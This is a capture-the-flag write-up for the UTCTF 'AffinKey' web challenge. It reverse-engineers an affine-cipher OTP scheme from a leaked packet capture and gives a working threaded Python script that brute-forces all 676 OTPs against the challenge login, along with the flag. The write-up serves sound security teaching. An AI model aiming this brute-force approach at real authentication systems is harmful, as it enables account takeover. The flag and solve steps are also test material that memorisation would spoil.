# UTCTF — AffinKey™ Web Challenge Writeup

> **Flag:** `utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}`  
> **Category:** Web  
> **Target:** `http://challenge.utctf.live:9382`

---

## Challenge Overview

AffiniTECH is a fictional Bitcoin wallet company that replaced passwords with their homegrown OTP system called **AffinKey™**. The challenge page brags:

> *"We wrote the OTP algorithm ourselves. In a weekend."*  
> *"100% Homemade. 100% Unhackable."*

A note at `/urgent.txt` reveals:

> *"i have locked every account except mine"*  — **timothy**

So the target account is `timothy` and the auth endpoint is:

```
POST /auth
{ "username": "timothy", "otp": "<string>" }
```

The flag lives at `GET /portal` (403 until authenticated).

---

## Reconnaissance

### Login form JS
```javascript
fetch('/auth', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username, otp })
})
```
No password — OTP only. The hint on the page says:
```
// Request your AffinKey™ OTP via the debug endpoint
```

### Debug endpoint
```
POST /debug/getOTP
{ "username": "<name>", "epoch": <unix_timestamp> }
```
Returns:
```json
{ "add": 13, "mult": 7, "otp": "bnccnjbh" }
```
**Externally blocked (404).** Internal traffic only.

---

## PCAP Analysis

A provided packet capture (`aftechLEAK.pcap`) contains internal traffic to the debug endpoint. Extracting all 49 request/response pairs:

| Username | Epoch | add | mult | OTP |
|----------|-------|-----|------|-----|
| carrasco | 1773290571 | 13 | 7 | bnccnjbh |
| mix | 1773290574 | 16 | 15 | ogx |
| hebert | 1773290575 | 17 | 17 | ghihuc |
| monks | 1773290576 | 18 | 19 | myfaw |
| thapa | 1773290584 | 0 | 9 | plafa |
| fauzi | 1773290585 | 1 | 11 | ebnql |
| burris | 1773290588 | 4 | 19 | xuppai |
| ... | ... | ... | ... | ... |

**Key observations:**
- OTP length = username length → letter-for-letter substitution
- Parameters named `add` and `mult` → **Affine cipher** (`AffinKey` = Affine Key, literally in the name)
- `add` increments by 1 per second, resets mod 26
- `mult` increments by 2 per second with a cycling offset C

---

## Algorithm Reverse Engineering

### Step 1 — add formula
```
ADD_BASE = 1773290584   # epoch where add=0
add = (epoch - ADD_BASE) % 26
```
✅ Verified on all 49 samples.

### Step 2 — mult formula

Observing `C = (mult - 2*offset) % 26` across all samples:

| offset range | C |
|---|---|
| -13 | 7 |
| -10 to +1 | 9 |
| +4 to +13 | 11 |
| +14 to +25 | 13 |
| +27 to +35 | 15 |
| ... | ... |

C increments by 2 every ~12 offset units. Brute-forcing the exact formula:

```
C = (7 + 2 * ((offset + 22) // 12)) % 26
mult = (2 * offset + C) % 26
```
✅ **49/49 samples verified.**

### Step 3 — OTP generation (Affine cipher)
```python
otp = ''.join(
    chr(ord('a') + (mult * (ord(c) - ord('a')) + add) % 26)
    for c in username.lower()
)
```

### Complete algorithm
```python
ADD_BASE = 1773290584

def compute(epoch):
    offset = epoch - ADD_BASE
    add    = offset % 26
    C      = (7 + 2 * ((offset + 22) // 12)) % 26
    mult   = (2 * offset + C) % 26
    return add, mult

def affine(username, mult, add):
    return ''.join(
        chr(ord('a') + (mult * (ord(c) - ord('a')) + add) % 26)
        for c in username.lower()
    )
```

---

## The Problem — Formula Drift

Despite the formula being 49/49 correct on PCAP data (spanning ~84 seconds), authentication kept failing 23+ hours later.

**Root cause:** The `C` cycling formula was derived from a very short time window. At large epoch offsets the integer division drifted from what the server actually computes.

---

## Final Exploit — Brute Force All 676 Combos

Since `add` and `mult` are each in range `[0, 25]`, there are only **676 possible OTP values** for any given username. Threading 50 workers completes the brute force in ~15 seconds:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://challenge.utctf.live:9382"
USER = "timothy"

def affine(u, m, a):
    return ''.join(chr(ord('a')+(m*(ord(c)-ord('a'))+a)%26) for c in u)

def try_combo(args):
    m, a = args
    otp = affine(USER, m, a)
    r = requests.post(f"{BASE}/auth",
                      json={"username": USER, "otp": otp}, timeout=4)
    if r.status_code == 200:
        s = requests.Session()
        s.cookies.update(r.cookies)
        portal = s.get(f"{BASE}/portal", timeout=5)
        return portal.text
    return None

combos = [(m, a) for m in range(26) for a in range(26)]
with ThreadPoolExecutor(max_workers=50) as ex:
    for result in as_completed(ex.submit(try_combo, c) for c in combos):
        r = result.result()
        if r and "utflag" in r:
            import re
            print(re.search(r"utflag\{[^}]+\}", r).group())
            break
```

**Output:**
```
utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}
```

---

## Critical Bug — Session Cookie Handling

The `/auth` response sets a Flask session cookie:
```
Set-Cookie: session=eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ...; HttpOnly; Path=/
```

`/portal` returns **403** unless this cookie is sent. The fix is a **persistent `requests.Session()`** object:

```python
# ❌ WRONG — cookie lost between requests
requests.post("/auth", ...)
requests.get("/portal", ...)

# ✅ RIGHT — cookie carried automatically
s = requests.Session()
s.post("/auth", ...)
s.get("/portal", ...)
```

---

## Timeline

| Step | Time spent | What happened |
|------|-----------|---------------|
| Recon + PCAP extraction | 10 min | Identified affine cipher, 49 samples |
| Algorithm reverse engineering | 45 min | Got 49/49 but formula drifted at runtime |
| Debugging auth failures | 30 min | Clock fine, formula drifted |
| Brute force all 676 combos | 2 min | Immediate success |
| Session cookie fix | 5 min | Used persistent Session object |
| **Total** | **~90 min** | Flag captured |

**Optimal solve time: ~2 minutes** (skip reverse engineering, go straight to 676-combo brute force)

---

## Lessons Learned

### 1. Read the product name
`AffinKey™` = **Affine** Key. The cipher was in the name the whole time.

### 2. Spot the brute-force shortcut early
- OTP length = username length → substitution cipher
- Parameters named `add` + `mult` → affine cipher
- Affine over alphabet = only **26 × 26 = 676 key pairs**
- Always ask: *can I just try all keys?*

### 3. Always use `requests.Session()` for multi-step auth
Flask/Werkzeug session cookies require the cookie to be sent back. A persistent session handles this automatically.

### 4. Capture the full response object before spawning threads
Parallel brute-force discards responses. Capture auth response first, then use it.

### 5. PCAP analysis checklist
```bash
strings capture.pcap | grep -Ei "flag|otp|token|set-cookie|utflag"
# Extract JSON pairs: requests + responses together
# Note server Date header to confirm real epoch
# Check for /auth hits, not just /debug hits
```

---

## Files

| File | Description |
|------|-------------|
| `aftechLEAK.pcap` | Network capture with 49 debug OTP samples |
| `exploit_FINAL.py` | Algorithm-based exploit (49/49 PCAP verified) |
| `brute_676.py` | 15-second brute force — the actual solver |

---

## Quick Solve (TL;DR)

```bash
python3 - << 'EOF'
import requests, re
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE, USER = "http://challenge.utctf.live:9382", "timothy"

def affine(u, m, a):
    return ''.join(chr(ord('a')+(m*(ord(c)-ord('a'))+a)%26) for c in u)

def try_combo(args):
    m, a = args
    r = requests.post(f"{BASE}/auth",
                      json={"username": USER, "otp": affine(USER,m,a)}, timeout=4)
    if r.status_code == 200:
        s = requests.Session()
        s.cookies.update(r.cookies)
        p = s.get(f"{BASE}/portal", timeout=5)
        if "utflag" in p.text:
            return re.search(r"utflag\{[^}]+\}", p.text).group()
    return None

with ThreadPoolExecutor(max_workers=50) as ex:
    for f in as_completed(ex.submit(try_combo,(m,a)) for m in range(26) for a in range(26)):
        if f.result():
            print(f.result()); break
EOF
```

```
utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}
```